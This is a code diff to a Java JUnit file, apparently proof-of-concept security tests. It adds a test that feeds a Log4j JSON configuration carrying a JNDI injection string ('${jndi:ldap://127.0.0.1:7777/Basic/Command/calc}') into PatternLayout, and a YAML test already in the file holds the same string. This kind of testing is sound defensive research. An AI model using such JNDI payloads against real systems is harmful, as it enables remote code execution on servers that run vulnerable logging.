@@ -13,6 +13,7 @@ import org.apache.logging.log4j.core.config.json.JsonConfigurationFactory;
 import org.apache.logging.log4j.core.config.yaml.YamlConfigurationFactory;
 import org.apache.logging.log4j.core.jmx.LoggerContextAdmin;
 import org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean;
+import org.apache.logging.log4j.core.layout.PatternLayout;
 import org.junit.jupiter.api.Test;
 
 import java.io.ByteArrayInputStream;
@@ -65,6 +66,19 @@ public class ConfigPocTests {
     }
 
     @Test
+    public void createPatternParserPatternLayoutTest(){
+        String configText = "{"
+                + "\"Configuration\": {"
+                + "    \"injectedProperty\": \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\""
+                + "}"
+                + "}";
+        ByteArrayInputStream bis = new ByteArrayInputStream(configText.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis, new File("config.json"));
+        Configuration config = ConfigurationFactory.getInstance().getConfiguration(new LoggerContext("testContext"), source);
+        PatternLayout.createDefaultLayout(config);
+    }
+
+    @Test
     public void getConfigurationYamlConfigurationFactoryTest() throws IOException {
         String yamlConfig = "Configuration:\n" +
                 "  injectedProperty: \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"";
@@ -111,4 +125,5 @@ public class ConfigPocTests {
         CompositeConfiguration compositeConfig = new CompositeConfiguration(Arrays.asList(config));
         compositeConfig.reconfigure();
     }
+
 }
